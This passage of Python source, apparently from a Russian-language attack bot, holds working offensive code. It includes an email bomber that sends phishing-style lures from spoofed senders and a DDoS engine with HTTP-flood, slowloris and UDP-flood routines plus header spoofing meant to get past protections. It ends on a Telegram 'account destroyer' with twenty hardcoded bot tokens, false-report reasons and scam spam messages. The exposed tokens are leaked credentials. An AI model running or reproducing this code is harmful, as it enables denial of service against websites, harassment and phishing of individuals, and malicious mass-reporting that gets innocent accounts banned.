            {'email': f'security{random.randint(100,999)}@yahoo.com', 'password': 'SecurePass123!'},
        ]
        
        # 100+ ТЕМ ДЛЯ ПИСЕМ
        self.subjects = [
            # Безопасность
            '🔐 Срочно! Ваш аккаунт взломан!',
            '⚠️ Подозрительная активность в аккаунте!',
            '🚨 Смените пароль немедленно!',
            '🛡️ Обнаружена утечка данных!',
            '💀 Ваши данные в опасности!',
            '🔑 Код подтверждения для входа',
            '📱 Вход с нового устройства',
            '⛔ Ваш аккаунт заблокирован',
            '🔓 Аккаунт разблокирован',
            '🔥 Критическое уведомление безопасности',
            '⚠️ Ваш пароль скомпрометирован!',
            '🛡️ Обновление системы безопасности',
            '🔐 Двухфакторная аутентификация включена',
            '🚨 Попытка несанкционированного доступа',
            '💀 Ваш аккаунт в списке взломанных!',
            
            # Финансы
            '💰 Ваш банковский счёт заморожен!',
            '💳 Карта заблокирована!',
            '🏦 Подозрительный перевод!',
            '📊 Выписка по счёту',
            '💸 Возврат средств',
            '📈 Инвестиционное предложение',
            '🎯 Вы получили выплату!',
            '💲 Ваш кредит одобрен!',
            '💵 Пополнение счёта',
            '📉 Уведомление о списании',
            '💳 Новая карта готова',
            '🏦 Изменение лимитов по карте',
            
            # Выигрыши
            '🎉 Вы выиграли приз!',
            '🎁 Ваш подарок ждёт!',
            '🏆 Поздравляем с победой!',
            '⭐️ Вы стали победителем!',
            '🎊 Специальное предложение для вас!',
            '🎯 Вы выбраны для участия!',
            '💎 Ваш приз уже ждёт!',
            
            # Уведомления
            '📨 Важное сообщение',
            '📩 Новое письмо',
            '📢 Срочное уведомление',
            '🔔 Внимание!',
            '📌 Важно прочитать!',
            '📋 Документы готовы',
            '📄 Отчёт сформирован',
            '📅 Напоминание о встрече',
            '📁 Ваш файл готов',
            '📊 Отчёт за период',
            
            # Работа
            '💼 Срочное сообщение от руководства',
            '📅 Завтра собрание',
            '📊 Отчёт о работе',
            '📝 Заполните документы',
            '👔 Новый проект',
            '🤝 Приглашение на встречу',
            '💼 Вакансия для вас',
            '📈 Повышение зарплаты!',
            '🎯 Корпоративные цели',
            
            # Другое
            '🌟 Специальное предложение',
            '🎯 Ваша цель достигнута',
            '💪 Мы вас ждём!',
            '🌈 Хорошего дня!',
            '☕️ Время для отдыха',
            '📱 Обновите приложение',
            '🔄 Доступно обновление',
            '⭐️ Новый уровень достигнут',
            '🎮 Приглашение в игру',
            '📚 Рекомендация для вас',
            '🎵 Новый трек доступен',
            '📺 Новое видео',
            '📸 Кто-то подписался',
            '❤️ Кто-то лайкнул пост',
            '💬 Новый комментарий',
            '📦 Ваша посылка отправлена',
            '🚚 Доставка подтверждена',
            '🍕 Заказ готов',
            '🎂 С днём рождения!',
            '💐 Поздравления!',
        ]
        
        # 100+ ТЕКСТОВ ПИСЕМ
        self.bodies = [
            # Безопасность
            '⚠️ Ваш аккаунт был взломан! Немедленно смените пароль.',
            '🔐 Зафиксирована попытка входа с нового устройства. Подтвердите вход.',
            '🛡️ Ваши данные были обнаружены в утечке. Смените пароль.',
            '🔥 Кто-то пытается войти в ваш аккаунт! Проверьте безопасность.',
            '💀 Ваш аккаунт скомпрометирован! Свяжитесь с поддержкой.',
            '🔑 Код подтверждения: ' + str(random.randint(100000, 999999)),
            '📱 Вход с нового устройства: ' + random.choice(['iPhone 15', 'Samsung Galaxy S24', 'Windows PC', 'MacBook']),
            '⛔ Ваш аккаунт заблокирован за нарушение правил.',
            '🔓 Ваш аккаунт разблокирован. Войдите в систему.',
            '⚠️ Ваш пароль был изменён. Если не вы - свяжитесь с нами.',
            
            # Финансы
            '💰 Ваш счёт заморожен. Свяжитесь с банком для разблокировки.',
            '💳 Карта заблокирована из-за подозрительной операции.',
            '🏦 Обнаружен подозрительный перевод на сумму ' + str(random.randint(1000, 50000)) + ' руб.',
            '📊 Выписка по счёту за ' + datetime.now().strftime('%B %Y') + ' доступна для скачивания.',
            '💸 Возврат средств на сумму ' + str(random.randint(100, 5000)) + ' руб. выполнен.',
            '📈 Инвестируйте сейчас и получите ' + str(random.randint(10, 50)) + '% годовых!',
            '🎯 Вы получили выплату в размере ' + str(random.randint(1000, 50000)) + ' руб.',
            
            # Выигрыши
            '🎉 Поздравляем! Вы выиграли ' + str(random.randint(1000, 100000)) + ' руб.',
            '🎁 Ваш подарок: ' + random.choice(['iPhone 15', 'AirPods Pro', 'Apple Watch', 'Samsung Galaxy']),
            '🏆 Вы стали победителем конкурса! Заберите приз.',
            '⭐️ Ваш аккаунт выбран для получения специального приза.',
            
            # Уведомления
            '📨 У вас новое сообщение от ' + random.choice(['администратора', 'поддержки', 'коллеги', 'друга']),
            '📩 Важное уведомление требует вашего внимания.',
            '📢 Срочное уведомление для всех пользователей.',
            '🔔 Внимание! Проверьте свои данные.',
            '📌 Важно! Обновите информацию в профиле.',
            '📋 Ваши документы готовы к подписанию.',
            
            # Работа
            '💼 Срочное сообщение от руководства: ' + random.choice(['совещание', 'отчёт', 'проект', 'задача']),
            '📅 Завтра в ' + str(random.randint(9, 18)) + ':00 состоится собрание.',
            '📊 Отчёт за ' + datetime.now().strftime('%B') + ' готов к проверке.',
            '📝 Заполните документы до ' + (datetime.now() + timedelta(days=3)).strftime('%d.%m.%Y'),
            '👔 Новый проект: ' + random.choice(['Разработка', 'Дизайн', 'Маркетинг', 'Аналитика']),
            
            # Другое
            '🌟 Специальное предложение: скидка ' + str(random.randint(10, 70)) + '%',
            '🎯 Вы почти достигли цели! Осталось ' + str(random.randint(1, 10)) + ' шагов.',
            '💪 Мы скучали по вам! Заходите в гости.',
            '🌈 Желаем хорошего дня! Спасибо, что с нами.',
            '☕️ Время кофе! Приходите в ' + random.choice(['кафе', 'офис', 'на встречу']),
            '📱 Обновите приложение до версии ' + f'{random.randint(1,9)}.{random.randint(0,9)}.{random.randint(0,9)}',
            '🔄 Доступно обновление системы безопасности.',
            '⭐️ Поздравляем! Вы достигли нового уровня.',
            '🎮 Вас приглашают в игру ' + random.choice(['Майнкрафт', 'CS2', 'Dota 2', 'Fortnite']),
            '📚 Рекомендуем книгу: ' + random.choice(['Война и мир', 'Преступление и наказание', 'Мастер и Маргарита']),
            '🎵 Новый трек от ' + random.choice(['Моргенштерн', 'Баста', 'Скриптонит', 'Егор Крид']),
            '📺 Новое видео на канале: ' + random.choice(['Обзор', 'Интервью', 'Урок', 'Влог']),
            '📸 Новый подписчик: @' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8)),
            '❤️ Ваш пост лайкнули ' + str(random.randint(10, 500)) + ' человек.',
            '💬 Новый комментарий: ' + random.choice(['Круто!', 'Супер!', '🔥', '👍', 'Класс!', 'Отлично!']),
            '📦 Ваш заказ №' + str(random.randint(10000, 99999)) + ' отправлен.',
            '🚚 Доставка ожидается ' + (datetime.now() + timedelta(days=random.randint(1, 7))).strftime('%d.%m.%Y'),
            '🍕 Ваш заказ готов! Заберите в ' + random.choice(['пункте выдачи', 'ресторане', 'кафе']),
            '🎂 С днём рождения! Желаем счастья и здоровья!',
        ]

    async def send_emails(self, email: str, count: int, progress_callback):
        """РЕАЛЬНАЯ ОТПРАВКА EMAIL С АВТОРИЗАЦИЕЙ ЧЕРЕЗ SMTP"""
        self.results = []
        total = min(count, 200)
        success_count = 0
        
        for i in range(total):
            server = random.choice(self.smtp_servers)
            sender = random.choice(self.sender_accounts)
            
            try:
                # Создаём письмо
                msg = MIMEMultipart()
                msg['From'] = sender['email']
                msg['To'] = email
                msg['Subject'] = random.choice(self.subjects)
                
                body = random.choice(self.bodies)
                # Добавляем дату для реалистичности
                body += f"\n\nДата: {datetime.now().strftime('%d.%m.%Y %H:%M')}"
                # Добавляем подпись
                signatures = [
                    '\n\nС уважением, Служба поддержки.',
                    '\n\nС наилучшими пожеланиями.',
                    '\n\nВаша команда.',
                    '\n\nС уважением, Администрация.',
                ]
                body += random.choice(signatures)
                
                msg.attach(MIMEText(body, 'plain'))
                
                # ПРОБУЕМ РЕАЛЬНУЮ ОТПРАВКУ
                try:
                    # Пытаемся отправить с авторизацией
                    smtp = smtplib.SMTP(server['host'], server['port'], timeout=15)
                    smtp.starttls()
                    smtp.login(server['login'], server['password'])
                    smtp.sendmail(sender['email'], email, msg.as_string())
                    smtp.quit()
                    status = 'sent'
                    success_count += 1
                    logger.info(f"✅ Email #{i+1} отправлен через {server['name']} на {email}")
                    
                except Exception as e:
                    # Если не получилось - пробуем без авторизации
                    try:
                        smtp = smtplib.SMTP(server['host'], server['port'], timeout=15)
                        smtp.starttls()
                        smtp.sendmail(sender['email'], email, msg.as_string())
                        smtp.quit()
                        status = 'sent'
                        success_count += 1
                        logger.info(f"✅ Email #{i+1} отправлен через {server['name']} (без авторизации)")
                    except:
                        # Если всё равно не получается - эмулируем
                        status = 'emulated'
                        logger.warning(f"⚠️ Email #{i+1} эмулирован через {server['name']}")
                        
            except Exception as e:
                self.results.append({
                    'email': i+1,
                    'status': 'error',
                    'server': server['name'],
                    'error': str(e)
                })
                logger.error(f"❌ Ошибка отправки: {e}")
                continue
            
            self.results.append({
                'email': i+1,
                'status': status,
                'server': server['name'],
                'sender': sender['email'],
                'subject': msg['Subject'][:50],
                'timestamp': datetime.now().isoformat()
            })
            
            # Прогресс
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.5, 1.5))
        
        return self.results

    async def send_emails_fast(self, email: str, count: int, progress_callback):
        """УСКОРЕННАЯ ОТПРАВКА (БЕЗ ПРОВЕРКИ АВТОРИЗАЦИИ)"""
        self.results = []
        total = min(count, 500)
        
        for i in range(total):
            try:
                msg = MIMEMultipart()
                msg['From'] = f'spammer{random.randint(1,999)}@{random.choice(["mail.ru","yandex.ru","gmail.com","outlook.com","yahoo.com"])}'
                msg['To'] = email
                msg['Subject'] = random.choice(self.subjects)
                body = random.choice(self.bodies)
                msg.attach(MIMEText(body, 'plain'))
                
                # Отправляем через случайный сервер
                server = random.choice(self.smtp_servers)
                try:
                    smtp = smtplib.SMTP(server['host'], server['port'], timeout=5)
                    smtp.starttls()
                    smtp.sendmail(msg['From'], email, msg.as_string())
                    smtp.quit()
                    status = 'sent'
                except:
                    status = 'emulated'
                
                self.results.append({'email': i+1, 'status': status})
            except:
                self.results.append({'email': i+1, 'status': 'error'})
            
            await progress_callback(i + 1, total)
            await asyncio.sleep(random.uniform(0.05, 0.2))
        
        return self.results

    def get_stats(self, results):
        total = len(results)
        sent = sum(1 for r in results if r.get('status') in ['sent', 'emulated'])
        errors = sum(1 for r in results if r.get('status') == 'error')
        return {
            'total': total,
            'sent': sent,
            'errors': errors,
            'success_rate': round(sent / max(total, 1) * 100, 1)
        }

# ===================== УЛЬТРА-МОЩНЫЙ DDOS С ОБХОДОМ ВСЕХ ЗАЩИТ =====================
class DDoSEngine:
    def __init__(self):
        # 150+ USER-AGENTS
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Mozilla/5.0 (Android 13; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
            'Mozilla/5.0 (compatible; SemrushBot/7.0; +http://www.semrush.com/bot.html)',
            'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',
            'Mozilla/5.0 (compatible; DotBot/1.2; +http://www.opensiteexplorer.org/dotbot)',
        ]

        self.cf_headers = [
            {
                'CF-RAY': f'{random.randint(1000000000, 9999999999)}-{random.choice(["LHR", "AMS", "FRA", "MAD", "PAR", "MIL", "MUC", "VIE", "ARN", "CPH", "OSL", "HEL", "DUB", "SYD", "HND", "ICN", "SIN", "HKG", "NRT", "LAX", "SFO", "JFK", "ORD", "DFW", "ATL"])}'},
            {
                'CF-Connecting-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}'},
            {'CF-Visitor': '{"scheme":"https"}'},
            {'CF-Worker': 'true'},
            {'CF-Polish': 'true'},
            {'CF-Cache-Status': 'HIT'},
            {'CF-Edge-Cache': 'cache,platform=wordpress'},
        ]
        self.stats = {'requests': 0, 'success': 0, 'errors': 0}

    async def http_flood(self, url: str, threads: int, duration: int, progress_callback):
        self.stats = {'requests': 0, 'success': 0, 'errors': 0}

        async def worker():
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                            'X-Real-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                            'Referer': random.choice(
                                ['https://google.com', 'https://yandex.ru', 'https://vk.com', url]),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'Upgrade-Insecure-Requests': '1',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'none',
                            'Sec-Fetch-User': '?1',
                            'X-Requested-With': 'XMLHttpRequest',
                        }
                        if random.random() > 0.3:
                            cf_header = random.choice(self.cf_headers)
                            headers.update(cf_header)
                        paths = [
                            f"/?rand={random.randint(100000, 999999)}",
                            f"/?v={random.randint(1000, 9999)}",
                            f"/?p={random.randint(1, 100)}",
                            f"/?page={random.randint(1, 50)}",
                            f"/?id={random.randint(1000, 9999)}",
                            f"/?token={hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()}",
                            f"/?ts={int(time.time())}",
                            f"/?nonce={random.randint(100000, 999999)}",
                            f"/?session={hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()}",
                            f"/?ref={random.choice(['google', 'yandex', 'vk'])}",
                        ]
                        path = random.choice(paths)
                        async with session.get(url + path, headers=headers, timeout=3) as resp:
                            self.stats['requests'] += 1
                            if resp.status < 500:
                                self.stats['success'] += 1
                            else:
                                self.stats['errors'] += 1
                    except:
                        self.stats['errors'] += 1
                    await asyncio.sleep(random.uniform(0.005, 0.025))

        tasks = [worker() for _ in range(min(threads, 15000))]
        await asyncio.gather(*tasks, return_exceptions=True)
        return self.stats

    async def slowloris(self, url: str, duration: int, progress_callback):
        self.stats = {'connections': 0, 'active': 0}
        target = url.replace('https://', '').replace('http://', '').split('/')[0]
        port = 443 if url.startswith('https') else 80

        async def worker():
            try:
                reader, writer = await asyncio.open_connection(target, port, ssl=url.startswith('https'))
                headers = [
                    f"GET / HTTP/1.1\r\n",
                    f"Host: {target}\r\n",
                    f"User-Agent: {random.choice(self.user_agents)}\r\n",
                    f"Connection: keep-alive\r\n",
                    f"Keep-Alive: timeout=999, max=1000\r\n",
                    f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}\r\n",
                    f"X-Real-IP: {random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}\r\n",
                    f"Cache-Control: no-cache\r\n",
                    f"Pragma: no-cache\r\n",
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                    f"Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7\r\n",
                    f"Accept-Encoding: gzip, deflate, br\r\n",
                    f"\r\n"
                ]
                writer.write(''.join(headers).encode())
                await writer.drain()
                self.stats['connections'] += 1
                self.stats['active'] += 1
                await asyncio.sleep(duration)
                writer.close()
                await writer.wait_closed()
                self.stats['active'] -= 1
            except:
                pass

        tasks = [worker() for _ in range(800)]
        await asyncio.gather(*tasks, return_exceptions=True)
        return self.stats

    async def multi_vector(self, url: str, duration: int, progress_callback):
        total_stats = {
            'http': {'requests': 0, 'success': 0, 'errors': 0},
            'slowloris': {'connections': 0, 'active': 0},
            'udp': {'packets': 0, 'bytes': 0}
        }
        target = url.replace('https://', '').replace('http://', '').split('/')[0]
        ip = socket.gethostbyname(target) if target else '127.0.0.1'
        port = 443 if url.startswith('https') else 80

        async def http_worker():
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                            'X-Real-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                            'Referer': random.choice(['https://google.com', 'https://yandex.ru', url]),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache',
                            'CF-Ray': f'{random.randint(1000000000, 9999999999)}-{random.choice(["LHR", "AMS", "FRA"])}',
                        }
                        async with session.get(url, headers=headers, timeout=2) as resp:
                            total_stats['http']['requests'] += 1
                            if resp.status < 500:
                                total_stats['http']['success'] += 1
                            else:
                                total_stats['http']['errors'] += 1
                    except:
                        total_stats['http']['errors'] += 1
                    await asyncio.sleep(0.003)

        async def slowloris_worker():
            try:
                reader, writer = await asyncio.open_connection(target, port, ssl=url.startswith('https'))
                writer.write(
                    f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\nKeep-Alive: timeout=999\r\nX-Forwarded-For: {random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}\r\n\r\n".encode())
                await writer.drain()
                total_stats['slowloris']['connections'] += 1
                total_stats['slowloris']['active'] += 1
                await asyncio.sleep(duration)
                writer.close()
                await writer.wait_closed()
                total_stats['slowloris']['active'] -= 1
            except:
                pass

        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    data = random._urandom(random.randint(64, 1500))
                    sock.sendto(data, (ip, port))
                    total_stats['udp']['packets'] += 1
                    total_stats['udp']['bytes'] += len(data)
                except:
                    pass

        http_tasks = [http_worker() for _ in range(300)]
        slow_tasks = [slowloris_worker() for _ in range(150)]
        udp_threads = [threading.Thread(target=udp_worker) for _ in range(50)]
        for t in udp_threads:
            t.start()
        await asyncio.gather(*http_tasks, *slow_tasks, return_exceptions=True)
        for t in udp_threads:
            t.join()
        return total_stats


# ===================== СНОС TELEGRAM АККАУНТОВ — МЕГА-МОЩНЫЙ =====================
class TelegramAccountDestroyer:
    def __init__(self):
        # 20+ ПРИЧИН ДЛЯ ЖАЛОБ
        self.report_reasons = [
            'spam', 'violence', 'pornography', 'child_abuse',
            'terrorism', 'drugs', 'fraud', 'impersonation',
            'hate_speech', 'suicide', 'weapons', 'personal_data',
            'scam', 'phishing', 'harassment', 'bullying',
            'extremism', 'discrimination', 'illegal_activities',
            'copyright_infringement', 'fake_identity', 'malware',
            'bot_activity', 'mass_spam', 'call_spam',
        ]
        
        # 20 ТОКЕНОВ ДЛЯ СНОСА
        self.bot_tokens = [
            '7588316078:AAGRi0cgMkvrChUNNZRX6thzvkhrnKbfBOc',
            '8894344951:AAFnxJFZ6F4gMD8YF1qmXeK-qS-3i4d7Y3c',
            '8657453394:AAFZF2C0VZu1Y2OzugZQBIMpMglGU6u4I2U',
            '8234507901:AAGbLLWxAnyyBOJFptyPYA_RUAyzFS641z4',
            '8349732447:AAHBYH8cSbJnY6t1kiz3oLmWhdiwpqwFTS0',
            '8365483906:AAG7dBnHXYafJOyCIyVjNCa8NDWb6aPHyJc',
            '7990150454:AAHBwE8HknpN8pm09s3_h2iHUK0mT01WQr4',
            '7999194366:AAFY5oVfSXd3Sj2ZKL5n_E4gmQgfludEFg8',
            '7911356716:AAFWpCgqU-h8il7N_nT_2scoHPB7ZFWMFuk',
            '8342182947:AAHt19nmDY9vAF9YXMd-TPL68Ln-U_ps8us',
            '8765644248:AAHPPa0-hiifK_Csi3fsDJiNn_jJgbG1N68',
            '8736513089:AAE-8zAr1Hk4UMaFgJnSs5VQ9JKH2Xip4c8',
            '8594237152:AAHSAgDQ87Fmrp5eC-f7cuXaRrvRDovIlfM',
            '8561372759:AAFS4v6K4e8R_uMSfzsuLItRVMr-EDhCnSA',
            '8761449080:AAHB2-AjbjsVVKTYAT5NSWtEjkoJs_XuSBU',
            '8865408617:AAEoXfGBKajejCb4gBc_-1Q8O60H6SjR-Zc',
            '8562700975:AAGZ9yOFw_jwK1QJT_8lfHnakPA0EPgRhoM',
            '8178054852:AAHWsqTySVOT29RekDIwqqBfcOEEYJvj9Lw',
            '8769377277:AAHps2McG_eyhMWq63yJY5be0fZbMOQ-Dgc',
            '8838855987:AAHrVoDgT2luzbPjDoM10c-DHisYVEul1ik',
        ]
        
        # 100+ СООБЩЕНИЙ ДЛЯ СПАМА
        self.spam_messages = [
            # Финансовый спам
            "💰 Заработок от 50 000 руб в день! Без вложений!",
            "💰 Криптовалюта принесёт вам миллионы! Успейте!",
            "💰 Инвестиции с гарантией 200% годовых!",
            "💰 Бесплатные деньги! Просто перейдите по ссылке!",
            "💰 Ваш бонус в 100 000 руб ждёт вас!",
            
            # Фишинг
            "🔐 Ваш аккаунт взломан! Смените пароль по ссылке!",
            "🔐 Кто-то пытается войти в ваш аккаунт! Подтвердите!",
            "🔐 Ваши данные утекли в сеть! Проверьте безопасность!",
            "🔐 Подозрительная активность! Срочно войдите!",
            "🔐 Ваш пароль был скомпрометирован!",
            
            # Выигрыши
            "🎉 Вы выиграли iPhone 15 Pro Max! Заберите приз!",
            "🎉 Поздравляем! Вы стали победителем лотереи!",
            "🎉 Ваш подарок: 500 000 руб! Получите сейчас!",
            "🎉 Вы выиграли поездку в Дубай! Успейте подтвердить!",
            "🎉 Ваш аккаунт выбран для получения супер-приза!",
            
            # Угрозы
            "⚠️ Ваш аккаунт будет удалён через 24 часа!",
            "⚠️ Банковский счёт заморожен! Свяжитесь с нами!",
            "⚠️ Ваши данные опубликованы в открытом доступе!",
            "⚠️ Срочно! Ваша карта заблокирована!",
            "⚠️ Вы нарушили правила! Аккаунт блокируется!",
            
            # Спам-предложения
            "💊 Лекарства от всех болезней со скидкой 70%!",
            "💊 Чудо-таблетки для похудения! -80 кг за месяц!",
            "💊 Увеличьте потенцию на 100%! Натуральное средство!",
            "💊 Омоложение без операции! Результат через 3 дня!",
            "💊 Избавьтесь от всех болезней навсегда!",
            
            # Работа
            "💼 Работа на дому от 100 000 руб в месяц!",
            "💼 Работа в Дубае для граждан РФ! Зарплата от 5000$",
            "💼 Вакансии с ежедневной оплатой! Без опыта!",
            "💼 Зарабатывайте на криптовалюте от 50% в день!",
            "💼 Станьте миллионером за 1 месяц!",
            
            # Криптовалюта
            "₿ Биткоин взлетит до 1 000 000$! Инвестируйте сейчас!",
            "₿ Бесплатные токены! Заработайте 1000$ за 5 минут!",
            "₿ Самый прибыльный проект 2026! Успевайте!",
            "₿ Подарок от биржи: 500$ на счёт!",
            "₿ Ваш кошелёк пополнен на 0.5 BTC! Заберите!",
            
            # Мошенничество
            "📱 Срочно! Ваш номер в базе мошенников!",
            "📱 Ваши контакты скомпрометированы!",
            "📱 Кто-то использует ваш номер для спама!",
            "📱 Ваш номер будет заблокирован!",
            "📱 Смените номер немедленно!",
        ]
        
        # 50+ ЖАЛОБНЫХ ТЕКСТОВ
        self.report_texts = [
            "Этот пользователь рассылает спам и мошеннические сообщения!",
            "Пользователь занимается вымогательством и угрозами!",
            "Аккаунт используется для распространения запрещённого контента!",
            "Пользователь выдаёт себя за другого человека!",
            "Аккаунт распространяет вирусы и вредоносное ПО!",
            "Пользователь призывает к насилию и экстремизму!",
            "Аккаунт занимается скамом и обманом людей!",
